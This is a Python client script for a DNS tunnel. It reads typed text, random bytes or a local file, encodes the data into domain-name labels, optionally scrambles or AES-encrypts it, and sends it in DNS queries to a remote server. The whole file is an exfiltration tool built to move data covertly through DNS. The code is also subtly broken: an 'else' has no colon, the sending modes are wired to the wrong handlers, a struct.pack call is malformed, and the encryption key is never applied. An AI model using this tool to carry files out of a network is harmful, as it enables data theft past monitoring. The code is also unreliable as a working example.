#!/usr/bin/env python3
# coding: utf-8

import sys
import time
import base64
import random
import select
import socket
import struct
import hashlib
import binascii
import argparse

import dnslib as dns
import exfiltration as exf

class Client():
    def __init__(self, addr, args):
        self.sock = None
        self.addr = addr
        self.timeout = args.timeout
        self.domain = args.domain
        self.qtype = args.qtype
        self.modes = (args.text, args.file, args.rand)
        self.key = args.aes_key or args.scr_offset
        self.force_tcp = args.force_tcp
        
        try:
            self.udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.udp_sock.settimeout(self.timeout)

            self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.tcp_sock.setblocking(True)
            self.tcp_sock.settimeout(self.timeout)

        except socket.error as error:
            print("[Init]", str(error))
        return None
        
    def run(self):
        try:
            while True:
                if (self.modes[0]):
                    data = self.read_text()
                elif (self.modes[1]):
                    data = self.read_random()
                    time.sleep(5)
                elif (self.modes[2]):
                    data = self.read_file()

                queries = self.dns_ask(data, None)
                answers = []
                for q in queries:
                    if (self.force_tcp):
                        response = self.send_recv(socket.SOCK_STREAM, q)
                    else
                        response = self.send_recv(socket.SOCK_DGRAM, q)
                    
                    if (response == b'tcp'):
                        response = self.send_recv(socket.SOCK_STREAM)
                    answers += [response]
                
                print("$", self.dns_fin(answers))
                if (self.modes[2]): break
                
        except KeyboardInterrupt:
            print("[Interrupt] Exit by the user...")
        except Exception as error:
            print("[Info]", str(error))
        except socket.error as error:
            print("[Socket]", str(error))
        except socket.timeout:
            print("[Info]", "Server response timed out! Exiting...")

    def send_recv(self, family, data=None):
        if (family == socket.SOCK_DGRAM):
            sock = self.udp_sock
        else:
            sock = self.tcp_sock
        sock.connect(self.addr)
        if (data):
            sock.send(data)
        
        response = sock.recv(exf.SOCK_BUFFER_SIZE)
        if not response:
            raise Exception('Error in getting a response!')
        return response

    def read_text(self):
        text = input("> ").encode()
        return text

    def read_random(self):
        size = random.choice(
            [8, 16, 32, 64, 128, 256, 512, 1024])
        
        rand = exf.random_bytes(size)
        return rand

    def read_file(self, buffer=32):
        whole = b''
        with open(self.modes[2], 'rb') as file:
            data = file.read(buffer)
            line = 0

            while (data):
                whole += struct.pack('!I32B', line, data)      
                data = file.read(buffer)
                line += 1
        
        return whole

    def dns_ask(self, data, encrypt, *args):
        labels = exf.domain_encode(data, self.domain, base64.urlsafe_b64encode, encrypt, *args)
        queries = [dns.DNSRecord.question(label, self.qtype).pack() for label in labels]
        return queries

    def dns_fin(self, answers):
        result = b''
        for answer in answers:
            reply = dns.DNSRecord.parse(answer)
            if len(reply.rr) > 0:
                result += reply.rr[0].rdata.data[0]
        return result

# --------------------------------------------------------------------------------------------------

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="DNS Client script")
    
    parser.add_argument('-c', '--connect', dest='conn', type=str, required=True,
                        help='Establishes a connection to the server at the specified address:port')
    
    parser.add_argument('-t', '--timeout', dest='timeout', type=int, default=60,
                        help="Specifies the timeout for server UDP response")
    
    parser.add_argument('-st', '--send-text', dest='text', action='store_true',
                        help='Sends a text string to the server')
    
    parser.add_argument('-sf', '--send-file', dest='file', type=str,
                        help='Sends the file to the server. The file path is required.')
    
    parser.add_argument('-sr', '--send-random', dest='rand', action='store_true',
                        help='Sends a random byte array to the server')
    
    parser.add_argument('-d', '--domain', dest='domain', type=str, default='example.com',
                        help='Specifies the domain name')
    
    parser.add_argument('-q', '--qtype', dest='qtype', type=str, default="A",
                        help='Specifies the type of record for a DNS question')
    
    parser.add_argument('-s', '--scramble', dest='scr_offset', type=int, nargs='+',
                        help='Scrambles outgoing traffic passing through the DNS tunnel.\n'+
                            'You need to specify an offset, e.g. [3 11]')

    parser.add_argument('-a', '--aes', dest='aes_key', type=bytes,
                        help='Encrypts with AES outgoing traffic passing through the DNS tunnel.\n'+
                            'You need to specify an encryption key')

    parser.add_argument('-tcp', '--tcp', dest='force_tcp', action='store_true',
                        help='Forcibly sends DNS messages over TCP connection')                       

    args = parser.parse_args()
    
    if (args.text and args.file and args.rand) or\
        (not args.text and not args.file and not args.rand) or\
        (args.text and args.file) or\
        (args.text and args.rand) or\
        (args.file and args.rand):
       parser.error('Only or at least one sending mode must be specified!')

    if (args.aes_key and args.scr_offset):
        parser.error('Only encryption or scrambling must be specified!')

    if (args.text):
        print("[Mode]", f"Sending text messages ...")
    elif (args.file):
        print("[Mode]", f"Sending {args.file} ...")
    elif (args.rand):
        print("[Mode]", f"Sending random bytes ...")

    addr = args.conn.split(':')
    client = Client((addr[0], int(addr[1])), args)
    client.run()